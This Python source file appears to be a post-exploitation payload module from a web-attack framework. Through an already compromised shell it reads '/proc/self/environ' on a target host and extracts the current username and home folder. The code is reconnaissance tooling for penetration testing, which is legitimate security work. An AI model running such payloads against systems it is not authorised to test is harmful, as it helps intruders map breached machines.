import re
from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


class current_user(base_payload):
    '''
    This payload shows current username & folder on the system.
    '''
    def api_read(self, parameters):
        result = {}
        result['current'] = {}

        def default_user( self_environ ):
            user = re.search('(?<=USER=)(.*?)\\x00', self_environ)
            if user:
                return user.group(1)
            else:
                return None
        
        def default_home( self_environ ):
            user = re.search('(?<=HOME=)(.*?)\\x00', self_environ)
            if user:
                return user.group(1)+'/'
            else:
                return None
        
        self_environ = self.shell.read('/proc/self/environ')
        if self_environ:
            result['current'] = ({'user':default_user(self_environ), 'home':default_home(self_environ)})
        
        return result
    
    def run_read(self, parameters):
        api_result = self.api_read( parameters )
                
        if not api_result['current']:
            return 'Current user not found.'
        else:
            rows = []
            rows.append( ['Current user'] )
            rows.append( [] )
            for key_name in api_result:
                for user in api_result[key_name]: 
                    rows.append( [ user, ] )
                    
            result_table = table( rows )
            result_table.draw( 80 )
            return
